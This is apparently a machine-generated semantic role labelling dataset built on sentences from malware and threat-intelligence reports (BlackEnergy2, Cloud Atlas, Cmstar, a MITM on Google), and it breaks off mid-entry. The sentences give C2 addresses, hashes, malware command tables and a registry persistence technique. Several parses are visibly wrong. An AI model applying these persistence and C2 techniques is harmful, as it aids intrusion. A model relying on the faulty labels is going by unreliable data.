"may": {"ARGM-ADV": {"text": "based on a specific USB and BIOS devices"}, "V": {"text": "may", "index": 26}}, "upload": {"ARGM-ADV": {"text": "based on a specific USB and BIOS devices"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "upload", "index": 27}, "ARG1": {"text": "specific plugins to carry out additional actions"}}, "carry": {"ARG0": {"text": "specific plugins"}, "V": {"text": "carry", "index": 31}, "ARG1": {"text": "additional actions"}}}, " Starting in March 2014 and ending in July 2014, Siemens\n\"ccprojectmgr.exe\" downloaded and executed a handful of different payloads hosted\nat 94.185.85.122/favicon.ico": {"Starting": {"V": {"text": "Starting", "index": 0}, "ARGM-TMP": {"text": "in March 2014 and ending in July 2014"}}, "ending": {"ARGM-TMP": {"text": "March/ in July 2014"}, "V": {"text": "ending", "index": 5}, "ARG1": {"text": "Siemens \" ccprojectmgr.exe \""}}, "downloaded": {"ARGM-TMP": {"text": "Starting in March 2014 and ending in July 2014"}, "ARG0": {"text": "Siemens \" ccprojectmgr.exe \""}, "V": {"text": "downloaded", "index": 14}, "ARG1": {"text": "a handful of different payloads hosted at 94.185.85.122/favicon.ico"}}, "executed": {"ARGM-TMP": {"text": "Starting in March 2014 and ending in July 2014"}, "ARG0": {"text": "Siemens \" ccprojectmgr.exe \""}, "V": {"text": "executed", "index": 16}, "ARG1": {"text": "a handful of different payloads hosted"}, "ARGM-LOC": {"text": "at 94.185.85.122/favicon.ico"}}, "hosted": {"ARG1": {"text": "different payloads"}, "V": {"text": "hosted", "index": 22}, "ARGM-LOC": {"text": "at 94.185.85.122/favicon.ico"}}}, " The server definitely delivered config files not only for Windows, but\nalso for the ARM/MIPS platform": {"delivered": {"ARG0": {"text": "The server"}, "ARGM-ADV": {"text": "definitely"}, "V": {"text": "delivered", "index": 3}, "ARG1": {"text": "config files"}, "ARGM-PRP": {"text": "not only for Windows , but also for the ARM"}}}, " Our observation of related actions here:\n<table>\n u ps                              start password stealing (Windows)\n Ps_mps/ps_hwi start               start password stealing (Linux, MIPS, ARM)\n                                   rewrite hook module with a new version and launch it\n uper_mps/uper_hwi start\n                                   (Linux, MIPS, ARM)\n Nm_mps/nm_hwi start \u2013             Scan ports and retrieve banners on the router subnet\n ban -middle                       (Linux, MIPS, ARM)\n U fsget * 7 *.docx, *.pdf,\n                                   search for docs with the given filetypes (Windows)\n *.doc *\n                                   retrieve information on installed programs and launch\n S sinfo                           commands: systeminfo, tasklist, ipconfig, netstat, route\n                                   table, trace route to google.com (Windows)\n weap_mps/weap_hwi\n host188.128.123.52\n                                   DDoS on 188.128.123.52 (Linux, MIPS, ARM)\n port[25,26,110,465,995]\n typetcpconnect\n weap_mps/weap_hwi\n typesynflood port80\n                                   DDoS on 212.175.109.10 (Linux, MIPS, ARM)\n cnt100000 spdmedium\n host212.175.109.10\n</table>\nThe issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM\ndevices": {"issued": {"V": {"text": "issued", "index": 8}, "ARG1": {"text": "commands"}}, "suggest": {"ARG0": {"text": "The issued commands for the Linux plugins"}, "V": {"text": "suggest", "index": 14}, "ARG1": {"text": "the attackers controlled infected MIPS / ARM devices"}}, "controlled": {"ARG1": {"text": "attackers"}, "V": {"text": "controlled", "index": 17}}, "infected": {"ARG2": {"text": "the attackers controlled"}, "V": {"text": "infected", "index": 18}, "ARG1": {"text": "MIPS / ARM devices"}}}, "\n\f\n\n<figure></figure>\n\n<caption>Hook module structure</caption>\n\nAfter decrypting the strings, it became clear that the Linux Hook main module communicated with the\nsame CnC server as other Windows modules:\n\n\n<figure></figure>\n\n<caption>The CNC's IP address in the Linux module</caption>\n\f\nThis Linux module can process the following commands, some of which are similar to the Windows\nversion:\n<table>\n die                delete all BlackEnergy2 files and system traces\n kill               delete all BlackEnergy2 files and system traces and reboot\n lexec              launch a command using bin/sh\n rexec              download and launch file using 'fork/exec'\n update             rewrite self file\n migrate            update the CnC server\n</table>\n</section>\n\n<section>\n<heading>Windows Plugins</heading>\n\nAfter the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid\ngreater attention to new BE2 samples and associated CnCs": {"pushed": {"ARG0": {"text": "an unusual CnC server"}, "R-ARG0": {"text": "that"}, "V": {"text": "pushed", "index": 9}, "ARG1": {"text": "Linux"}}, "paid": {"ARGM-TMP": {"text": "After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins"}, "ARG0": {"text": "we"}, "V": {"text": "paid", "index": 17}, "ARG1": {"text": "greater attention"}, "ARG2": {"text": "to new BE2 samples and associated CnCs"}}, "associated": {"ARG0": {"text": "we"}, "V": {"text": "associated", "index": 25}, "ARG1": {"text": "CnCs"}}}, "\n\nThe malware connects back to the exploit domain pic.nicklockluckydog[.]org as well as the subdomain\nssl.nicklockluckydog[.]org": {"connects": {"ARG0": {"text": "The malware"}, "V": {"text": "connects", "index": 2}, "ARGM-DIR": {"text": "back"}, "ARG1": {"text": "to the exploit domain pic.nicklockluckydog[.]org as well as the subdomain ssl.nicklockluckydog[.]org"}}}, " In turn, The malicious DLL\nloads a backdoor binary blob MD5: 16E5A27BD55E0B4E595C9743F4C75611 (ticrf.rat)": {"loads": {"ARGM-DIS": {"text": "In turn"}, "ARG0": {"text": "The malicious DLL"}, "V": {"text": "loads", "index": 6}, "ARG1": {"text": "a backdoor binary blob MD5 : 16E5A27BD55E0B4E595C9743F4C75611 ( ticrf.rat )"}}}, " LMS.exe will load any DLL file name\ndbghelp.dll that is found in the same path, hence the sideloading technique": {"will": {"ARG0": {"text": "LMS.exe"}, "V": {"text": "will", "index": 1}, "ARG1": {"text": "load any DLL file name dbghelp.dll that is found in the same path , hence the sideloading technique"}}, "load": {"ARG0": {"text": "LMS.exe"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "load", "index": 2}, "ARG2": {"text": "any DLL file name/ in the same path , hence the sideloading"}, "ARG1": {"text": "dbghelp.dll that is found"}}, "is": {"V": {"text": "is", "index": 9}}, "found": {"ARG1": {"text": "any DLL file name dbghelp.dll"}, "R-ARG1": {"text": "that"}, "V": {"text": "found", "index": 10}, "ARGM-LOC": {"text": "in the same path"}}}, " The evidence we've observed instead indicate that the MITM attack is performed either by\nperforming IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent\nSSL proxy": {"'ve": {"V": {"text": "'ve", "index": 3}}, "observed": {"ARG1": {"text": "The evidence"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 4}}, "indicate": {"ARG0": {"text": "The evidence we 've observed"}, "ARGM-DIS": {"text": "instead"}, "V": {"text": "indicate", "index": 6}, "ARG1": {"text": "that the MITM attack is performed either by performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy"}}, "is": {"V": {"text": "is", "index": 11}}, "performed": {"ARG1": {"text": "the MITM attack"}, "V": {"text": "performed", "index": 12}, "ARGM-ADV": {"text": "either"}, "ARGM-MNR": {"text": "by performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy"}}, "performing": {"V": {"text": "performing", "index": 15}, "ARG1": {"text": "IP hijacking"}}, "reconfiguring": {"ARGM-ADV": {"text": "simply"}, "V": {"text": "reconfiguring", "index": 21}, "ARG1": {"text": "a router to forward the HTTPS traffic"}}}, " A\nreasonable assumption is therefore that the MITM is carried out on the 2001:252::/32 network, or where\nAS23910 (2001:da8:1::2) connects to AS23911 (2001:252:0:1::1)": {"is": {"ARG1": {"text": "A reasonable assumption"}, "V": {"text": "is", "index": 3}, "ARGM-ADV": {"text": "therefore"}, "ARG2": {"text": "that the MITM is carried out on the 2001:252::/32 network , or where AS23910 ( 2001:da8:1::2 ) connects to AS23911 ( 2001:252:0:1::1 )"}}, "is_2": {"V": {"text": "is", "index": 8}}, "carried": {"ARG1": {"text": "the MITM"}, "V": {"text": "carried", "index": 9}, "ARGM-TMP": {"text": "on the 2001:252::/32 network , or where AS23910 ( 2001:da8:1::2 ) connects to AS23911 ( 2001:252:0:1::1 )"}}}, "<doc>\n<section>\n<heading>Analysis of Chinese MITM on Google</heading>\nThursday, 04 September 2014 23:55:00 (UTC/GMT)\n\nThe Chinese are running a MITM attack on SSL encrypted traffic between Chinese universities and\nGoogle": {"are": {"V": {"text": "are", "index": 13}}, "running": {"ARGM-TMP": {"text": "Thursday"}, "ARG0": {"text": "04/ ( UTC / GMT/ The Chinese"}, "V": {"text": "running", "index": 14}, "ARG1": {"text": "a MITM attack on SSL"}, "ARGM-ADV": {"text": "encrypted traffic between Chinese universities and Google"}}, "encrypted": {"V": {"text": "encrypted", "index": 20}, "ARG1": {"text": "traffic"}, "ARGM-LOC": {"text": "between Chinese universities and Google"}}}, " Again, this is a clear indication of an IP MITM taking place,\nsince Google cannot possibly send a response from the US to CERNET within 8ms regardless of how fast\nthey are": {"is": {"ARGM-DIS": {"text": "Again"}, "ARG1": {"text": "this"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "a clear indication of an IP MITM taking place"}, "ARGM-CAU": {"text": "since Google can not possibly send a response from the US to CERNET within 8ms regardless of how fast they are"}}, "taking": {"ARG1": {"text": "an IP MITM"}, "V": {"text": "taking", "index": 11}, "ARG2": {"text": "place"}}, "send": {"ARG0": {"text": "Google"}, "ARGM-MOD": {"text": "can"}, "ARGM-NEG": {"text": "not"}, "ARGM-ADV": {"text": "possibly/ regardless of how fast they are"}, "V": {"text": "send", "index": 19}, "ARG1": {"text": "a response"}, "ARG2": {"text": "from the US"}, "C-ARG1": {"text": "to CERNET within 8ms"}}, "CERNET": {"V": {"text": "CERNET", "index": 26}, "ARGM-LOC": {"text": "within 8ms"}, "ARGM-ADV": {"text": "regardless of how fast they are"}}, "are": {"ARG2": {"text": "how fast"}, "ARG1": {"text": "they"}, "V": {"text": "are", "index": 34}}}, "\n</section>\n\n<section>\n<heading>Conclusions</heading>\n\nAll evidence indicates that a MITM attack is being conducted against traffic between China\u2019s nationwide\neducation and research network CERNET and www.google.com": {"indicates": {"ARG0": {"text": "All evidence"}, "V": {"text": "indicates", "index": 2}, "ARG1": {"text": "that a MITM attack is being conducted against traffic between China \u2019s nationwide education and research network CERNET and www.google.com"}}, "is": {"V": {"text": "is", "index": 7}}, "being": {"V": {"text": "being", "index": 8}}, "conducted": {"ARG1": {"text": "a MITM attack"}, "V": {"text": "conducted", "index": 9}, "ARGM-ADV": {"text": "against traffic"}, "ARGM-LOC": {"text": "between China \u2019s nationwide education and research network CERNET and www.google.com"}}}, "\n\nWe previously observed only one other group using a similar method \u2013 ItaDuke \u2013 that connected to\naccounts on the cloud provider mydrive.ch": {"observed": {"ARG0": {"text": "We"}, "ARGM-TMP": {"text": "previously"}, "V": {"text": "observed", "index": 2}, "ARG1": {"text": "only one other group using a similar method \u2013 ItaDuke \u2013 that connected to accounts on the cloud provider mydrive.ch"}}, "using": {"V": {"text": "using", "index": 7}, "ARG1": {"text": "a similar method \u2013 ItaDuke \u2013 that"}, "ARG2": {"text": "to accounts on the cloud provider mydrive.ch"}}, "connected": {"ARG1": {"text": "that"}, "V": {"text": "connected", "index": 15}, "ARG2": {"text": "to accounts on the cloud provider mydrive.ch"}}}, " In\nturn, the malware uploads the replies back to the server via the same mechanism": {"uploads": {"ARGM-DIS": {"text": "In turn"}, "ARG0": {"text": "the malware"}, "V": {"text": "uploads", "index": 5}, "ARG1": {"text": "the replies back to the server"}, "ARGM-MNR": {"text": "via the same mechanism"}}}, "\n</section>\n\n<section>\n<heading>C&C communication</heading>\n\nThe Cloud Atlas implants utilize a rather unusual C&C mechanism": {"utilize": {"ARG0": {"text": "The Cloud Atlas implants"}, "V": {"text": "utilize", "index": 4}, "ARG1": {"text": "a rather unusual C&C mechanism"}}}, "\n\nInterestingly, some of the spear-phishing documents between Cloud Atlas and RedOctober seem to exploit\nthe same theme and were used to target the same entity at different times": {"phishing": {"ARG0": {"text": "spear"}, "V": {"text": "phishing", "index": 7}, "ARG1": {"text": "documents"}}, "seem": {"ARGM-ADV": {"text": "Interestingly"}, "ARG1": {"text": "some of the spear - phishing documents between Cloud Atlas and RedOctober"}, "V": {"text": "seem", "index": 14}, "C-ARG1": {"text": "to exploit the same theme"}}, "exploit": {"ARG0": {"text": "some of the spear - phishing documents between Cloud Atlas and RedOctober"}, "V": {"text": "exploit", "index": 16}, "ARG1": {"text": "the same theme"}}, "were": {"V": {"text": "were", "index": 21}}, "used": {"ARGM-ADV": {"text": "Interestingly"}, "ARG1": {"text": "some of the spear - phishing documents between Cloud Atlas and RedOctober"}, "V": {"text": "used", "index": 22}, "ARG2": {"text": "to target the same entity at different times"}}, "target": {"ARG0": {"text": "some of the spear - phishing documents between Cloud Atlas and RedOctober"}, "V": {"text": "target", "index": 24}, "ARG1": {"text": "the same entity"}, "ARGM-TMP": {"text": "at different times"}}}, " The payload is always\nencrypted with a unique key, making it impossible to decrypt unless the DLL is available": {"is": {"ARG1": {"text": "The payload"}, "V": {"text": "is", "index": 2}, "ARGM-TMP": {"text": "always"}, "ARG2": {"text": "encrypted with a unique key/ it impossible to decrypt"}, "ARGM-ADV": {"text": "making/ unless the DLL is available"}}, "encrypted": {"ARG1": {"text": "The payload"}, "ARGM-TMP": {"text": "always"}, "V": {"text": "encrypted", "index": 4}, "ARGM-MNR": {"text": "with a unique key"}, "ARGM-ADV": {"text": "making it impossible to decrypt unless the DLL is available"}}, "making": {"V": {"text": "making", "index": 10}, "ARG1": {"text": "it impossible to decrypt"}, "ARGM-ADV": {"text": "unless the DLL is available"}}, "decrypt": {"V": {"text": "decrypt", "index": 14}}, "is_2": {"ARG1": {"text": "the DLL"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "available"}}}, "\n\nSome of the filenames used in the attacks included:\n<list>\n       FT - Ukraine Russia's new art of war.doc\n       \u041a\u0430\u0442\u0430\u0441\u0442\u0440\u043e\u0444\u0430 \u043c\u0430\u043b\u0430\u0439\u0437\u0438\u0439\u0441\u043a\u043e\u0433\u043e \u043b\u0430\u0439\u043d\u0435\u0440\u0430.doc\n       Diplomatic Car for Sale.doc\n       \u041c\u0412\u041a\u0421\u0418.doc\n       Organigrama Gobierno Rusia.doc\n       \u0424\u043e\u0442\u043e.doc\n       \u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0435 \u043f\u0438\u0441\u044c\u043c\u043e.doc\n       \u0424\u043e\u0440\u043c\u0430 \u0437\u0430\u044f\u0432\u043a\u0438 (25-26.09.14).doc\n       \u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0435 \u043f\u0438\u0441\u044c\u043c\u043e.doc\n\f\n      \u041f\u0438\u0441\u044c\u043c\u043e_\u0420\u0443\u043a\u043e\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044f\u043c.doc\n      \u041f\u0440\u0438\u043b\u043e\u0436.doc\n      Car for sale.doc\n      Af-Pak and Central Asia's security issues.doc\n</list>\nAt least one of them immediately reminded us of RedOctober, which used a very similarly named\nspearphish: \"Diplomatic Car for Sale.doc\"": {"used": {"ARG1": {"text": "the filenames"}, "V": {"text": "used", "index": 4}, "ARGM-LOC": {"text": "in the attacks"}}, "included": {"ARG1": {"text": "Some of the filenames used in the attacks"}, "V": {"text": "included", "index": 8}, "ARG2": {"text": "At least one of them immediately reminded us of RedOctober/ \" Diplomatic Car for Sale.doc \""}, "C-ARG1": {"text": ", which used a very similarly named spearphish :"}}, "reminded": {"ARG0": {"text": "At least one of them"}, "ARGM-TMP": {"text": "immediately"}, "V": {"text": "reminded", "index": 16}, "ARG2": {"text": "us"}, "ARG1": {"text": "of RedOctober , which used a very similarly named spearphish : \" Diplomatic Car for Sale.doc \""}}, "used_2": {"ARG0": {"text": "RedOctober"}, "R-ARG0": {"text": "which"}, "V": {"text": "used", "index": 22}, "ARG1": {"text": "a very similarly named spearphish : \" Diplomatic Car for Sale.doc \""}}, "named": {"ARG1": {"text": "RedOctober"}, "ARGM-MNR": {"text": "very similarly"}, "V": {"text": "named", "index": 26}, "ARG2": {"text": "spearphish"}}}, "\n\nHere's a look at one such account from CloudMe:\n\n<figure></figure>\n\n\nThe data from the account:\n\f\n\n<figure></figure>\n\nThe files stored in the randomly named folder were uploaded by the malware and contain various things,\nsuch as system information, running processes and current username": {"'s": {"ARG2": {"text": "Here"}, "V": {"text": "'s", "index": 1}, "ARG1": {"text": "a look at one such account from CloudMe"}}, "stored": {"ARG1": {"text": "The files"}, "V": {"text": "stored", "index": 13}, "ARGM-LOC": {"text": "in the randomly named folder"}}, "named": {"ARGM-MNR": {"text": "randomly"}, "V": {"text": "named", "index": 17}, "ARG2": {"text": "folder"}}, "were": {"ARG1": {"text": "The files stored in the randomly named folder"}, "V": {"text": "were", "index": 19}, "ARG2": {"text": "uploaded by the malware"}}, "uploaded": {"ARG1": {"text": "The files stored in the randomly named folder"}, "V": {"text": "uploaded", "index": 20}, "ARG0": {"text": "by the malware"}}, "contain": {"ARG0": {"text": "The files"}, "V": {"text": "contain", "index": 25}, "ARG1": {"text": "various things , such as system information , running processes and current username"}}, "running": {"V": {"text": "running", "index": 34}, "ARG1": {"text": "processes and current username"}}}, " All the malware samples we've seen\ncommunicate via HTTPS and WebDav with the same server \"cloudme.com\", a cloud services provider": {"'ve": {"V": {"text": "'ve", "index": 5}}, "seen": {"ARG0": {"text": "we"}, "V": {"text": "seen", "index": 6}, "ARG1": {"text": "communicate via HTTPS and WebDav with"}}}, " The data is compressed with LZMA\nand encrypted with AES, however, the keys are stored in the malware body which makes it possible to\ndecrypt the information from the C&C": {"is": {"ARG1": {"text": "The data"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "compressed with LZMA"}}, "compressed": {"ARG1": {"text": "The data"}, "V": {"text": "compressed", "index": 3}, "ARGM-MNR": {"text": "with LZMA"}}, "encrypted": {"ARG1": {"text": "The data"}, "V": {"text": "encrypted", "index": 7}, "ARGM-MNR": {"text": "with AES"}}, "are": {"V": {"text": "are", "index": 15}}, "stored": {"ARGM-DIS": {"text": "however"}, "ARG1": {"text": "the keys"}, "V": {"text": "stored", "index": 16}, "ARGM-LOC": {"text": "in the malware body"}, "ARGM-ADV": {"text": "which makes it possible to decrypt the information from the C&C"}}, "makes": {"ARG0": {"text": "the malware body"}, "R-ARG0": {"text": "which"}, "V": {"text": "makes", "index": 22}, "ARG1": {"text": "it possible to decrypt the information from the C&C"}}, "decrypt": {"V": {"text": "decrypt", "index": 26}, "ARG1": {"text": "the information from the C&C"}}}, " Instead, it writes an encrypted Visual Basic Script and runs it": {"writes": {"ARGM-DIS": {"text": "Instead"}, "ARG0": {"text": "it"}, "V": {"text": "writes", "index": 3}, "ARG1": {"text": "an encrypted Visual Basic Script"}}, "encrypted": {"V": {"text": "encrypted", "index": 5}, "ARG1": {"text": "Visual"}}, "runs": {"ARGM-DIS": {"text": "Instead"}, "ARG0": {"text": "it"}, "V": {"text": "runs", "index": 10}, "ARG1": {"text": "it"}}}, " For\ninstance, the \"qPd0aKJu.vbs\" file MD5:\n\f\nE211C2BAD9A83A6A4247EC3959E2A730 drops the following files:\n<list>\nDECF56296C50BD3AE10A49747573A346 - bicorporate - encrypted payload\nD171DB37EF28F42740644F4028BCF727 - ctfmonrn.dll - loader\n</list>\nThe VBS also adds a registry key:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ setting the\nkey \"bookstore\" to the value \"regsvr32 %path%\\ctfmonrn.dll /s\", which ensures the malware runs every\ntime at system boot": {"drops": {"ARG0": {"text": "E211C2BAD9A83A6A4247EC3959E2A730"}, "V": {"text": "drops", "index": 11}, "ARG1": {"text": "the following files"}}, "following": {"V": {"text": "following", "index": 13}, "ARG1": {"text": "files"}}, "adds": {"ARG0": {"text": "The VBS"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "adds", "index": 19}, "ARG1": {"text": "a registry key"}}, "setting": {"ARG0": {"text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"}, "V": {"text": "setting", "index": 25}, "ARG1": {"text": "the key \" bookstore \""}, "ARG2": {"text": "to the value"}}, "ensures": {"ARG0": {"text": "the value \" regsvr32 % path%\\ctfmonrn.dll /s"}, "R-ARG0": {"text": "which"}, "V": {"text": "ensures", "index": 42}, "ARG1": {"text": "the malware runs"}, "ARGM-TMP": {"text": "every time at system boot"}}, "runs": {"ARG1": {"text": "the malware"}, "V": {"text": "runs", "index": 45}, "ARGM-TMP": {"text": "every time"}, "ARG4": {"text": "at system boot"}}}, " Most Chinese-speaking attackers simply relocate C&C servers to a different place,\nrecompile the malware and carry on as if nothing happened": {"speaking": {"ARG1": {"text": "Chinese"}, "V": {"text": "speaking", "index": 3}, "ARG0": {"text": "attackers"}}, "relocate": {"ARG0": {"text": "Most Chinese - speaking attackers"}, "ARGM-ADV": {"text": "simply"}, "V": {"text": "relocate", "index": 6}, "ARG1": {"text": "C&C servers"}, "ARG2": {"text": "to a different place"}}, "recompile": {"ARG0": {"text": "Most Chinese - speaking attackers"}, "V": {"text": "recompile", "index": 14}, "ARG1": {"text": "the malware"}}, "carry": {"ARG1": {"text": "Most Chinese - speaking attackers"}, "V": {"text": "carry", "index": 18}, "ARGM-MNR": {"text": "as if nothing happened"}}, "happened": {"ARG1": {"text": "nothing"}, "V": {"text": "happened", "index": 23}}}, "\n\nSome of the DLL names we observed include:\n<list>\nf4e15c1c2c95c651423dbb4cbe6c8fd5 - bicorporate.dll\n649ff144aea6796679f8f9a1e9f51479 - fundamentive.dll\n40e70f7f5d9cb1a669f8d8f306113485 - papersaving.dll\n58db8f33a9cdd321d9525d1e68c06456 - previliges.dll\nf5476728deb53fe2fa98e6a33577a9da - steinheimman.dll\n</list>\nSome of the payload names include:\n<list>\nsteinheimman\npapersaving\npreviliges\nfundamentive\nbicorporate\nmiditiming\ndamnatorily\nmunnopsis\narzner\nredtailed\nroodgoose\nacholias\nsalefians\nwartworts\nfrequencyuse\nnonmagyar\nshebir\ngetgoing\n</list>\n\f\nThe payload includes an encrypted configuration block which contains information about the C&C sever:\n\n<figure></figure>\n\n\nThe information from the config includes a WebDAV URL which is used for connections, a username and\npassword, two folders on the WebDAV server used to store plugins/modules for the malware and where\ndata from the victim should be uploaded": {"observed": {"ARG1": {"text": "the DLL names"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 6}}, "include": {"ARG2": {"text": "Some of the DLL names we observed"}, "V": {"text": "include", "index": 7}, "ARG1": {"text": "The information from the config includes a WebDAV URL which is used for connections , a username and password , two folders on the WebDAV server used to store plugins / modules for the malware and where data from the victim should be uploaded"}}, "includes": {"ARG2": {"text": "The information from the config"}, "V": {"text": "includes", "index": 14}, "ARG1": {"text": "a WebDAV URL which is used for connections , a username and password , two folders on the WebDAV server used to store plugins / modules for the malware and where data from the victim should be uploaded"}}, "is": {"V": {"text": "is", "index": 19}}, "used": {"ARG1": {"text": "a WebDAV URL"}, "R-ARG1": {"text": "which"}, "V": {"text": "used", "index": 20}, "ARG2": {"text": "for connections"}}, "used_2": {"V": {"text": "used", "index": 35}, "ARG2": {"text": "to store plugins/ the malware"}}, "store": {"ARG0": {"text": "two folders on the WebDAV server"}, "V": {"text": "store", "index": 37}, "ARG1": {"text": "plugins / modules for the malware"}}, "should": {"V": {"text": "should", "index": 50}}, "be": {"ARG1": {"text": "data from the victim"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "be", "index": 51}, "ARG2": {"text": "uploaded"}}, "uploaded": {"ARGM-LOC": {"text": "where"}, "ARG1": {"text": "data from the victim"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "uploaded", "index": 52}}}, "\n\n<figure></figure>\n\n\nEach malware set we have observed so far communicates with a different CloudMe account though": {"set": {"ARG0": {"text": "Each malware"}, "V": {"text": "set", "index": 2}}, "have": {"V": {"text": "have", "index": 4}}, "observed": {"ARG0": {"text": "we"}, "V": {"text": "observed", "index": 5}, "ARGM-TMP": {"text": "so far"}, "ARG1": {"text": "communicates with a different CloudMe account"}, "ARGM-ADV": {"text": "though"}}}, " The\nattackers upload data to the account, which is downloaded by the implant, decrypted and interpreted": {"upload": {"ARG0": {"text": "The attackers"}, "V": {"text": "upload", "index": 2}, "ARG1": {"text": "data"}, "ARGM-DIR": {"text": "to the account , which is downloaded by the implant , decrypted and interpreted"}}, "is": {"V": {"text": "is", "index": 9}}, "downloaded": {"ARG1": {"text": "the account"}, "R-ARG1": {"text": "which"}, "V": {"text": "downloaded", "index": 10}, "ARG0": {"text": "by the implant"}}, "decrypted": {"ARG1": {"text": "the account/ which"}, "V": {"text": "decrypted", "index": 15}}, "interpreted": {"R-ARG2": {"text": "which"}, "V": {"text": "interpreted", "index": 17}}}, "\n\nWe observed several different spear-phishing documents that drop uniquely named payloads": {"observed": {"ARG0": {"text": "We"}, "V": {"text": "observed", "index": 1}, "ARG1": {"text": "several different spear - phishing documents that drop uniquely named payloads"}}, "phishing": {"ARGM-MNR": {"text": "spear"}, "V": {"text": "phishing", "index": 6}, "ARG0": {"text": "documents"}}, "drop": {"ARG1": {"text": "several different spear - phishing documents/ uniquely named payloads"}, "R-ARG0": {"text": "that"}, "V": {"text": "drop", "index": 9}}, "named": {"ARG1": {"text": "several different spear - phishing documents/ drop uniquely"}, "R-ARG1": {"text": "that"}, "V": {"text": "named", "index": 11}, "ARG2": {"text": "payloads"}}}, " Based on observations from KSN, some\nof the victims of RedOctober are also being targeted by CloudAtlas": {"Based": {"V": {"text": "Based", "index": 0}, "ARG2": {"text": "on observations from KSN"}}, "are": {"V": {"text": "are", "index": 12}}, "being": {"V": {"text": "being", "index": 14}}, "targeted": {"ARGM-ADV": {"text": "Based on observations from KSN"}, "ARG1": {"text": "some of the victims of RedOctober"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "targeted", "index": 15}, "ARG0": {"text": "by CloudAtlas"}}}, "\n\n\n<figure></figure>\n\n                              <caption>Cloud Atlas exploit payload - VBScript</caption>\n\nThis VBScript drops a pair of files on disk - a loader and an encrypted payload": {"drops": {"ARG0": {"text": "This VBScript"}, "V": {"text": "drops", "index": 2}, "ARG1": {"text": "a pair of files on disk - a loader and an encrypted payload"}}, "encrypted": {"V": {"text": "encrypted", "index": 14}, "ARG1": {"text": "payload"}}}, "\n</section>\n\n<section>\n<heading> Conclusion </heading>\n\nThe Cmstar tool has several interesting features, including a previously unseen method of manually\ncreating its import address table using an API function name character to offset mapping techniques, and\na hashing algorithm used to find antivirus processes on an infected system": {"has": {"ARG0": {"text": "The Cmstar tool"}, "V": {"text": "has", "index": 3}, "ARG1": {"text": "several interesting features , including a previously unseen method of manually creating its import address table using an API function name character to offset mapping techniques , and a hashing algorithm used to find antivirus processes on an infected system"}}, "including": {"ARG2": {"text": "several interesting features"}, "V": {"text": "including", "index": 8}, "ARG1": {"text": "a previously unseen method of manually creating its import address table using an API function name character to offset mapping techniques , and a hashing algorithm used to find antivirus processes on an infected system"}}, "creating": {"ARGM-MNR": {"text": "manually/ using an API function name character to offset mapping techniques"}, "V": {"text": "creating", "index": 15}, "ARG1": {"text": "its import address table"}}, "using": {"V": {"text": "using", "index": 20}, "ARG1": {"text": "an API function name character"}, "ARG2": {"text": "to offset mapping techniques , and a hashing algorithm used to find antivirus processes on an infected system"}}, "offset": {"ARG2": {"text": "an API function name character"}, "V": {"text": "offset", "index": 27}, "ARG1": {"text": "mapping techniques"}}, "hashing": {"V": {"text": "hashing", "index": 33}, "ARG0": {"text": "algorithm"}}, "used": {"ARG1": {"text": "a hashing algorithm"}, "V": {"text": "used", "index": 35}, "ARG2": {"text": "to find antivirus processes on an infected system"}}, "find": {"ARG0": {"text": "a hashing"}, "V": {"text": "find", "index": 37}, "ARG1": {"text": "antivirus processes"}, "ARGM-LOC": {"text": "on an infected system"}}}, "\n</section>\n\n<section>\n<heading> Hashing Process Names </heading>\n\nAs mentioned in the behavioral analysis section, the Cmstar downloader gathers system-specific\ninformation to send to the C2 server": {"mentioned": {"V": {"text": "mentioned", "index": 1}, "ARGM-LOC": {"text": "in the behavioral analysis section"}}, "gathers": {"ARGM-ADV": {"text": "As mentioned in the behavioral analysis section"}, "ARG0": {"text": "the Cmstar downloader"}, "V": {"text": "gathers", "index": 11}, "ARG1": {"text": "system - specific information"}, "ARGM-PRP": {"text": "to send to the C2 server"}}, "send": {"ARG0": {"text": "the Cmstar"}, "V": {"text": "send", "index": 17}, "ARG4": {"text": "to the C2 server"}}}, " Cmwhite Tools Using \u201ccgl-bin\u201d within HTTP Requests </caption>\n\nCmstar\u2019s HTTP POST requests sent to \u2018happy.launchtrue[.]com\u2019 contain data that the Trojan gathers from\nthe infected machine that has the following structure:\n\n<Windows Version number>@@<CPU Architecture (2 for x64, 1 for x86)>??<boolean for elevated\nprivileges>]]**<boolean if antivirus processes are found>!!<static version string>==\n\nIn one example, Unit 42 observed the following data within an analysis environment, which was then\nencrypted using a single-byte XOR algorithm and a key of 0x45 before being sent to the C2 server:\n\f510@@1??1]]**0!!150316o==\n\nHelpfully, the malware author writes log messages to the \u2018DF64159.TMP\u2019 file, used for debugging purposes\nthroughout the execution of the Cmstar downloader": {"Using": {"ARG0": {"text": "Cmwhite Tools"}, "V": {"text": "Using", "index": 2}, "ARG1": {"text": "\u201c cgl - bin \u201d"}, "ARGM-LOC": {"text": "within HTTP Requests = = In one example"}}, "observed": {"ARG0": {"text": "Unit 42"}, "V": {"text": "observed", "index": 19}, "ARG1": {"text": "the following data within an analysis environment , which was then encrypted using a single - byte XOR algorithm and a key of 0x45 before being sent to the C2 server"}}, "following": {"V": {"text": "following", "index": 21}, "ARG1": {"text": "data"}}, "was": {"ARG1": {"text": "data within/ an analysis environment"}, "R-ARG1": {"text": 